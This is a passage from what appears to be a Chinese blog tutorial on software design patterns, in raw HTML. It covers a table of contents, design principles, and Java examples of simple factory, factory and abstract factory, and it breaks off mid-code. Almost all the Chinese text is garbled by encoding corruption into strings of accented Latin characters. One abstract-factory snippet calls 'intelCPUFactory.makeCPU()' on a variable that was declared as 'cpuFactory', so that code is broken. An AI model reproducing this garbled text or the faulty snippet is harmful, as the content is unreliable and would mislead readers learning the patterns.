href="#%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F">ä»£ç†æ¨¡å¼</a></li><li><a href="#%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F">é€‚é…å™¨æ¨¡å¼</a><ul><li><a href="#%E9%BB%98%E8%AE%A4%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F">é»˜è®¤é€‚é…å™¨æ¨¡å¼</a></li><li><a href="#%E5%AF%B9%E8%B1%A1%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F">å¯¹è±¡é€‚é…å™¨æ¨¡å¼</a></li><li><a href="#%E7%B1%BB%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F">ç±»é€‚é…å™¨æ¨¡å¼</a></li><li><a href="#%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F%E6%80%BB%E7%BB%93">é€‚é…å™¨æ¨¡å¼æ€»ç»“</a></li></ul></li><li><a href="#%E6%A1%A5%E6%A2%81%E6%A8%A1%E5%BC%8F">æ¡¥æ¢æ¨¡å¼</a></li><li><a href="#%E8%A3%85%E9%A5%B0%E6%A8%A1%E5%BC%8F">è£…é¥°æ¨¡å¼</a></li><li><a href="#%E9%97%A8%E9%9D%A2%E6%A8%A1%E5%BC%8F">é—¨é¢æ¨¡å¼</a></li><li><a href="#%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F">ç»„åˆæ¨¡å¼</a></li><li><a href="#%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F">äº«å…ƒæ¨¡å¼</a></li><li><a href="#%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F%E6%80%BB%E7%BB%93">ç»“æ„å‹æ¨¡å¼æ€»ç»“</a></li></ul></li><li><a href="#%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F">è¡Œä¸ºå‹æ¨¡å¼</a><ul><li><a href="#%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F">ç­–ç•¥æ¨¡å¼</a></li><li><a href="#%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F">è§‚å¯Ÿè€…æ¨¡å¼</a></li><li><a href="#%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F">è´£ä»»é“¾æ¨¡å¼</a></li><li><a href="#%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F">æ¨¡æ¿æ–¹æ³•æ¨¡å¼</a></li><li><a href="#%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F">çŠ¶æ€æ¨¡å¼</a></li><li><a href="#%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F%E6%80%BB%E7%BB%93">è¡Œä¸ºå‹æ¨¡å¼æ€»ç»“</a></li></ul></li><li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li></ul><ul><li><a href="#jdk%E4%B8%AD%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F">JDKä¸­çš„è®¾è®¡æ¨¡å¼</a><ul><li><a href="#creational%E5%88%9B%E5%BB%BA%E6%A8%A1%E5%BC%8F">Creationalï¼ˆåˆ›å»ºæ¨¡å¼ï¼‰</a><ul><li><a href="#abstract-factory%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F">Abstract factoryï¼ˆæŠ½è±¡å·¥å‚æ¨¡å¼ï¼‰:</a></li><li><a href="#builder%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F">Builderï¼ˆå»ºé€ è€…æ¨¡å¼ï¼‰:</a></li><li><a href="#factory%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F">Factoryï¼ˆå·¥å‚æ¨¡å¼ï¼‰:</a></li><li><a href="#prototype%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F">Prototypeï¼ˆåŸå‹æ¨¡å¼ï¼‰:</a></li><li><a href="#singleton%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F">Singletonï¼ˆå•ä¾‹æ¨¡å¼ï¼‰:</a></li></ul></li><li><a href="#structural%E7%BB%93%E6%9E%84%E6%A8%A1%E5%BC%8F">Structuralï¼ˆç»“æ„æ¨¡å¼ï¼‰</a><ul><li><a href="#adapter%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F">Adapterï¼ˆé€‚é…å™¨æ¨¡å¼ï¼‰:</a></li><li><a href="#bridge%E6%A1%A5%E6%A2%81%E6%A8%A1%E5%BC%8F">Bridgeï¼ˆæ¡¥æ¢æ¨¡å¼ï¼‰ï¼š</a></li><li><a href="#composite%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F">Compositeï¼ˆç»„åˆæ¨¡å¼ï¼‰:</a></li><li><a href="#decorator%E8%A3%85%E9%A5%B0%E6%A8%A1%E5%BC%8F">Decoratorï¼ˆè£…é¥°æ¨¡å¼ï¼‰:</a></li><li><a href="#facade%E9%97%A8%E9%9D%A2%E6%A8%A1%E5%BC%8F">Facadeï¼ˆé—¨é¢æ¨¡å¼ï¼‰:</a></li><li><a href="#flyweight%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F">Flyweightï¼ˆäº«å…ƒæ¨¡å¼ï¼‰:</a></li><li><a href="#proxy%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F">Proxyï¼ˆä»£ç†æ¨¡å¼ï¼‰:</a></li></ul></li><li><a href="#behavioral%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%BC%8F">Behavioral(è¡Œä¸ºæ¨¡å¼)</a><ul><li><a href="#chain-of-responsibility%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F">Chain of responsibilityï¼ˆè´£ä»»é“¾æ¨¡å¼ï¼‰:</a></li><li><a href="#command%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F">Commandï¼ˆå‘½ä»¤æ¨¡å¼ï¼‰:</a></li><li><a href="#interpreter">Interpreter:</a></li><li><a href="#iterator">Iterator:</a></li><li><a href="#mediator">Mediator:</a></li><li><a href="#memento%E5%A4%87%E5%BF%98%E5%BD%95%E6%A8%A1%E5%BC%8F">Mementoï¼ˆå¤‡å¿˜å½•æ¨¡å¼ï¼‰:</a></li><li><a href="#null-object">Null Object:</a></li><li><a href="#observer%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F">Observerï¼ˆè§‚å¯Ÿè€…æ¨¡å¼ï¼‰:</a></li><li><a href="#state%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F">Stateï¼ˆçŠ¶æ€æ¨¡å¼ï¼‰:</a></li><li><a href="#strategy%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F">Strategyï¼ˆç­–ç•¥æ¨¡å¼ï¼‰:</a></li><li><a href="#template-method%E6%A8%A1%E6%9D%BF%E6%A8%A1%E5%BC%8F">Template methodï¼ˆæ¨¡æ¿æ¨¡å¼ï¼‰:</a></li><li><a href="#visitor">Visitor:</a></li></ul></li></ul></li></ul><!-- tocstop --><p>ä¸€ç›´æƒ³å†™ä¸€ç¯‡ä»‹ç»è®¾è®¡æ¨¡å¼çš„æ–‡ç« ï¼Œè®©è¯»è€…å¯ä»¥å¾ˆå¿«çœ‹å®Œï¼Œè€Œä¸”ä¸€çœ‹å°±æ‡‚ï¼Œçœ‹æ‡‚å°±ä¼šç”¨ï¼ŒåŒæ—¶ä¸ä¼šå°†å„ä¸ªæ¨¡å¼ææ··ã€‚è‡ªè®¤ä¸ºæœ¬æ–‡è¿˜æ˜¯å†™å¾—ä¸é”™çš„ğŸ˜‚ğŸ˜‚ğŸ˜‚ï¼ŒèŠ±äº†ä¸å°‘å¿ƒæ€æ¥å†™è¿™æ–‡ç« å’Œåšå›¾ï¼ŒåŠ›æ±‚è®©è¯»è€…çœŸçš„èƒ½çœ‹ç€ç®€å•åŒæ—¶æœ‰æ‰€æ”¶è·ã€‚</p><p>è®¾è®¡æ¨¡å¼æ˜¯å¯¹å¤§å®¶å®é™…å·¥ä½œä¸­å†™çš„å„ç§ä»£ç è¿›è¡Œé«˜å±‚æ¬¡æŠ½è±¡çš„æ€»ç»“ï¼Œå…¶ä¸­æœ€å‡ºåçš„å½“å± <em>Gang of Four</em> (<em>GoF</em>) çš„åˆ†ç±»äº†ï¼Œä»–ä»¬å°†è®¾è®¡æ¨¡å¼åˆ†ç±»ä¸º 23 ç§ç»å…¸çš„æ¨¡å¼ï¼Œæ ¹æ®ç”¨é€”æˆ‘ä»¬åˆå¯ä»¥åˆ†ä¸ºä¸‰å¤§ç±»ï¼Œåˆ†åˆ«ä¸ºåˆ›å»ºå‹æ¨¡å¼ã€ç»“æ„å‹æ¨¡å¼å’Œè¡Œä¸ºå‹æ¨¡å¼ã€‚</p><p>æœ‰ä¸€äº›é‡è¦çš„è®¾è®¡åŸåˆ™åœ¨å¼€ç¯‡å’Œå¤§å®¶åˆ†äº«ä¸‹ï¼Œè¿™äº›åŸåˆ™å°†è´¯é€šå…¨æ–‡ï¼š</p><ol><li>é¢å‘æ¥å£ç¼–ç¨‹ï¼Œè€Œä¸æ˜¯é¢å‘å®ç°ã€‚è¿™ä¸ªå¾ˆé‡è¦ï¼Œä¹Ÿæ˜¯ä¼˜é›…çš„ã€å¯æ‰©å±•çš„ä»£ç çš„ç¬¬ä¸€æ­¥ï¼Œè¿™å°±ä¸éœ€è¦å¤šè¯´äº†å§ã€‚</li><li>èŒè´£å•ä¸€åŸåˆ™ã€‚æ¯ä¸ªç±»éƒ½åº”è¯¥åªæœ‰ä¸€ä¸ªå•ä¸€çš„åŠŸèƒ½ï¼Œå¹¶ä¸”è¯¥åŠŸèƒ½åº”è¯¥ç”±è¿™ä¸ªç±»å®Œå…¨å°è£…èµ·æ¥ã€‚</li><li>å¯¹ä¿®æ”¹å…³é—­ï¼Œå¯¹æ‰©å±•å¼€æ”¾ã€‚å¯¹ä¿®æ”¹å…³é—­æ˜¯è¯´ï¼Œæˆ‘ä»¬è¾›è¾›è‹¦è‹¦åŠ ç­å†™å‡ºæ¥çš„ä»£ç ï¼Œè¯¥å®ç°çš„åŠŸèƒ½å’Œè¯¥ä¿®å¤çš„ bug éƒ½å®Œæˆäº†ï¼Œåˆ«äººå¯ä¸èƒ½è¯´æ”¹å°±æ”¹ï¼›å¯¹æ‰©å±•å¼€æ”¾å°±æ¯”è¾ƒå¥½ç†è§£äº†ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨æˆ‘ä»¬å†™å¥½çš„ä»£ç åŸºç¡€ä¸Šï¼Œå¾ˆå®¹æ˜“å®ç°æ‰©å±•ã€‚</li></ol><p><strong>åˆ›å»ºå‹æ¨¡å¼æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯ä¼šæ¯”è¾ƒæ²¡æœ‰æ„æ€ï¼Œç»“æ„å‹å’Œè¡Œä¸ºå‹æ¯”è¾ƒæœ‰æ„æ€ã€‚</strong></p><h2><span id="åˆ›å»ºå‹æ¨¡å¼">åˆ›å»ºå‹æ¨¡å¼</span></h2><p>åˆ›å»ºå‹æ¨¡å¼çš„ä½œç”¨å°±æ˜¯åˆ›å»ºå¯¹è±¡ï¼Œè¯´åˆ°åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œæœ€ç†Ÿæ‚‰çš„å°±æ˜¯ new ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶å set ç›¸å…³å±æ€§ã€‚ä½†æ˜¯ï¼Œåœ¨å¾ˆå¤šåœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ç»™å®¢æˆ·ç«¯æä¾›æ›´åŠ å‹å¥½çš„åˆ›å»ºå¯¹è±¡çš„æ–¹å¼ï¼Œå°¤å…¶æ˜¯é‚£ç§æˆ‘ä»¬å®šä¹‰äº†ç±»ï¼Œä½†æ˜¯éœ€è¦æä¾›ç»™å…¶ä»–å¼€å‘è€…ç”¨çš„æ—¶å€™ã€‚</p><h3><span id="ç®€å•å·¥å‚æ¨¡å¼">ç®€å•å·¥å‚æ¨¡å¼</span></h3><p>å’Œåå­—ä¸€æ ·ç®€å•ï¼Œéå¸¸ç®€å•ï¼Œç›´æ¥ä¸Šä»£ç å§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FoodFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Food <span class="title function_">makeFood</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">&quot;noodle&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">Food</span> <span class="variable">noodle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LanZhouNoodle</span>();</span><br><span class="line">            noodle.addSpicy(<span class="string">&quot;more&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> noodle;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;chicken&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">Food</span> <span class="variable">chicken</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HuangMenChicken</span>();</span><br><span class="line">            chicken.addCondiment(<span class="string">&quot;potato&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> chicken;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>å…¶ä¸­ï¼ŒLanZhouNoodle å’Œ HuangMenChicken éƒ½ç»§æ‰¿è‡ª Foodã€‚</em></p><p>ç®€å•åœ°è¯´ï¼Œç®€å•å·¥å‚æ¨¡å¼é€šå¸¸å°±æ˜¯è¿™æ ·ï¼Œä¸€ä¸ªå·¥å‚ç±» XxxFactoryï¼Œé‡Œé¢æœ‰ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œæ ¹æ®æˆ‘ä»¬ä¸åŒçš„å‚æ•°ï¼Œè¿”å›ä¸åŒçš„æ´¾ç”Ÿè‡ªåŒä¸€ä¸ªçˆ¶ç±»ï¼ˆæˆ–å®ç°åŒä¸€æ¥å£ï¼‰çš„å®ä¾‹å¯¹è±¡ã€‚</p><blockquote><p>æˆ‘ä»¬å¼ºè°ƒ<strong>èŒè´£å•ä¸€</strong>åŸåˆ™ï¼Œä¸€ä¸ªç±»åªæä¾›ä¸€ç§åŠŸèƒ½ï¼ŒFoodFactory çš„åŠŸèƒ½å°±æ˜¯åªè¦è´Ÿè´£ç”Ÿäº§å„ç§ Foodã€‚</p></blockquote><h3><span id="å·¥å‚æ¨¡å¼">å·¥å‚æ¨¡å¼</span></h3><p>ç®€å•å·¥å‚æ¨¡å¼å¾ˆç®€å•ï¼Œå¦‚æœå®ƒèƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€è¦ï¼Œæˆ‘è§‰å¾—å°±ä¸è¦æŠ˜è…¾äº†ã€‚ä¹‹æ‰€ä»¥éœ€è¦å¼•å…¥å·¥å‚æ¨¡å¼ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬å¾€å¾€éœ€è¦ä½¿ç”¨ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„å·¥å‚ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">FoodFactory</span> &#123;</span><br><span class="line">    Food <span class="title function_">makeFood</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChineseFoodFactory</span> <span class="keyword">implements</span> <span class="title class_">FoodFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Food <span class="title function_">makeFood</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">&quot;A&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChineseFoodA</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;B&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChineseFoodB</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AmericanFoodFactory</span> <span class="keyword">implements</span> <span class="title class_">FoodFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Food <span class="title function_">makeFood</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">&quot;A&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AmericanFoodA</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;B&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AmericanFoodB</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼ŒChineseFoodAã€ChineseFoodBã€AmericanFoodAã€AmericanFoodB éƒ½æ´¾ç”Ÿè‡ª Foodã€‚</p><p>å®¢æˆ·ç«¯è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// å…ˆé€‰æ‹©ä¸€ä¸ªå…·ä½“çš„å·¥å‚</span></span><br><span class="line">        <span class="type">FoodFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChineseFoodFactory</span>();</span><br><span class="line">        <span class="comment">// ç”±ç¬¬ä¸€æ­¥çš„å·¥å‚äº§ç”Ÿå…·ä½“çš„å¯¹è±¡ï¼Œä¸åŒçš„å·¥å‚é€ å‡ºä¸ä¸€æ ·çš„å¯¹è±¡</span></span><br><span class="line">        <span class="type">Food</span> <span class="variable">food</span> <span class="operator">=</span> factory.makeFood(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶éƒ½æ˜¯è°ƒç”¨ makeFood(â€œAâ€)  åˆ¶ä½œ A ç±»é£Ÿç‰©ï¼Œä½†æ˜¯ï¼Œä¸åŒçš„å·¥å‚ç”Ÿäº§å‡ºæ¥çš„å®Œå…¨ä¸ä¸€æ ·ã€‚</p><p>ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬éœ€è¦é€‰å–åˆé€‚çš„å·¥å‚ï¼Œç„¶åç¬¬äºŒæ­¥åŸºæœ¬ä¸Šå’Œç®€å•å·¥å‚ä¸€æ ·ã€‚</p><p><strong>æ ¸å¿ƒåœ¨äºï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç¬¬ä¸€æ­¥é€‰å¥½æˆ‘ä»¬éœ€è¦çš„å·¥å‚</strong>ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬æœ‰ LogFactory æ¥å£ï¼Œå®ç°ç±»æœ‰ FileLogFactory å’Œ KafkaLogFactoryï¼Œåˆ†åˆ«å¯¹åº”å°†æ—¥å¿—å†™å…¥æ–‡ä»¶å’Œå†™å…¥ Kafka ä¸­ï¼Œæ˜¾ç„¶ï¼Œæˆ‘ä»¬å®¢æˆ·ç«¯ç¬¬ä¸€æ­¥å°±éœ€è¦å†³å®šåˆ°åº•è¦å®ä¾‹åŒ– FileLogFactory è¿˜æ˜¯ KafkaLogFactoryï¼Œè¿™å°†å†³å®šä¹‹åçš„æ‰€æœ‰çš„æ“ä½œã€‚</p><p>è™½ç„¶ç®€å•ï¼Œä¸è¿‡æˆ‘ä¹ŸæŠŠæ‰€æœ‰çš„æ„ä»¶éƒ½ç”»åˆ°ä¸€å¼ å›¾ä¸Šï¼Œè¿™æ ·è¯»è€…çœ‹ç€æ¯”è¾ƒæ¸…æ™°ï¼š</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/factory-1.png" alt="factory-1"></p><h3><span id="æŠ½è±¡å·¥å‚æ¨¡å¼">æŠ½è±¡å·¥å‚æ¨¡å¼</span></h3><p>å½“æ¶‰åŠåˆ°<strong>äº§å“æ—</strong>çš„æ—¶å€™ï¼Œå°±éœ€è¦å¼•å…¥æŠ½è±¡å·¥å‚æ¨¡å¼äº†ã€‚</p><p>ä¸€ä¸ªç»å…¸çš„ä¾‹å­æ˜¯é€ ä¸€å°ç”µè„‘ã€‚æˆ‘ä»¬å…ˆä¸å¼•å…¥æŠ½è±¡å·¥å‚æ¨¡å¼ï¼Œçœ‹çœ‹æ€ä¹ˆå®ç°ã€‚</p><p>å› ä¸ºç”µè„‘æ˜¯ç”±è®¸å¤šçš„æ„ä»¶ç»„æˆçš„ï¼Œæˆ‘ä»¬å°† CPU å’Œä¸»æ¿è¿›è¡ŒæŠ½è±¡ï¼Œç„¶å CPU ç”± CPUFactory ç”Ÿäº§ï¼Œä¸»æ¿ç”± MainBoardFactory ç”Ÿäº§ï¼Œç„¶åï¼Œæˆ‘ä»¬å†å°† CPU å’Œä¸»æ¿æ­é…èµ·æ¥ç»„åˆåœ¨ä¸€èµ·ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/abstract-factory-1.png" alt="factory-1"></p><p>è¿™ä¸ªæ—¶å€™çš„å®¢æˆ·ç«¯è°ƒç”¨æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¾—åˆ° Intel çš„ CPU</span></span><br><span class="line"><span class="type">CPUFactory</span> <span class="variable">cpuFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntelCPUFactory</span>();</span><br><span class="line"><span class="type">CPU</span> <span class="variable">cpu</span> <span class="operator">=</span> intelCPUFactory.makeCPU();</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¾—åˆ° AMD çš„ä¸»æ¿</span></span><br><span class="line"><span class="type">MainBoardFactory</span> <span class="variable">mainBoardFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AmdMainBoardFactory</span>();</span><br><span class="line"><span class="type">MainBoard</span> <span class="variable">mainBoard</span> <span class="operator">=</span> mainBoardFactory.make();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»„è£… CPU å’Œä¸»æ¿</span></span><br><span class="line"><span class="type">Computer</span> <span class="variable">computer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Computer</span>(cpu, mainBoard);</span><br></pre></td></tr></table></figure><p>å•ç‹¬çœ‹ CPU å·¥å‚å’Œä¸»æ¿å·¥å‚ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯å‰é¢æˆ‘ä»¬è¯´çš„<strong>å·¥å‚æ¨¡å¼</strong>ã€‚è¿™ç§æ–¹å¼ä¹Ÿå®¹æ˜“æ‰©å±•ï¼Œå› ä¸ºè¦ç»™ç”µè„‘åŠ ç¡¬ç›˜çš„è¯ï¼Œåªéœ€è¦åŠ ä¸€ä¸ª HardDiskFactory å’Œç›¸åº”çš„å®ç°å³å¯ï¼Œä¸éœ€è¦ä¿®æ”¹ç°æœ‰çš„å·¥å‚ã€‚</p><p>ä½†æ˜¯ï¼Œè¿™ç§æ–¹å¼æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯å¦‚æœ <strong>Intel å®¶äº§çš„ CPU å’Œ AMD äº§çš„ä¸»æ¿ä¸èƒ½å…¼å®¹ä½¿ç”¨</strong>ï¼Œé‚£ä¹ˆè¿™ä»£ç å°±å®¹æ˜“å‡ºé”™ï¼Œå› ä¸ºå®¢æˆ·ç«¯å¹¶ä¸çŸ¥é“å®ƒä»¬ä¸å…¼å®¹ï¼Œä¹Ÿå°±ä¼šé”™è¯¯åœ°å‡ºç°éšæ„ç»„åˆã€‚</p><p>ä¸‹é¢å°±æ˜¯æˆ‘ä»¬è¦è¯´çš„<strong>äº§å“æ—</strong>çš„æ¦‚å¿µï¼Œå®ƒä»£è¡¨äº†ç»„æˆæŸä¸ªäº§å“çš„ä¸€ç³»åˆ—é™„ä»¶çš„é›†åˆï¼š</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/abstract-factory-2.png" alt="abstract-factory-2"></p><p>å½“æ¶‰åŠåˆ°è¿™ç§äº§å“æ—çš„é—®é¢˜çš„æ—¶å€™ï¼Œå°±éœ€è¦æŠ½è±¡å·¥å‚æ¨¡å¼æ¥æ”¯æŒäº†ã€‚æˆ‘ä»¬ä¸å†å®šä¹‰ CPU å·¥å‚ã€ä¸»æ¿å·¥å‚ã€ç¡¬ç›˜å·¥å‚ã€æ˜¾ç¤ºå±å·¥å‚ç­‰ç­‰ï¼Œæˆ‘ä»¬ç›´æ¥å®šä¹‰ç”µè„‘å·¥å‚ï¼Œæ¯ä¸ªç”µè„‘å·¥å‚è´Ÿè´£ç”Ÿäº§æ‰€æœ‰çš„è®¾å¤‡ï¼Œè¿™æ ·èƒ½ä¿è¯è‚¯å®šä¸å­˜åœ¨å…¼å®¹é—®é¢˜ã€‚</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/abstract-factory-3.png" alt="abstract-factory-3"></p><p>è¿™ä¸ªæ—¶å€™ï¼Œå¯¹äºå®¢æˆ·ç«¯æ¥è¯´ï¼Œä¸å†éœ€è¦å•ç‹¬æŒ‘é€‰ CPUå‚å•†ã€ä¸»æ¿å‚å•†ã€ç¡¬ç›˜å‚å•†ç­‰ï¼Œç›´æ¥é€‰æ‹©ä¸€å®¶å“ç‰Œå·¥å‚ï¼Œå“ç‰Œå·¥å‚ä¼šè´Ÿè´£ç”Ÿäº§æ‰€æœ‰çš„ä¸œè¥¿ï¼Œè€Œä¸”èƒ½ä¿è¯è‚¯å®šæ˜¯å…¼å®¹å¯ç”¨çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// ç¬¬ä¸€æ­¥å°±è¦é€‰å®šä¸€ä¸ªâ€œå¤§å‚â€</span></span><br><span class="line">    <span class="type">ComputerFactory</span> <span class="variable">cf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AmdFactory</span>();</span><br><span class="line">    <span class="comment">// ä»è¿™ä¸ªå¤§å‚é€  CPU</span></span><br><span class="line">    <span class="type">CPU</span> <span class="variable">cpu</span> <span class="operator">=</span> cf.makeCPU();</span><br><span class="line">    <span class="comment">// ä»è¿™ä¸ªå¤§å‚é€ 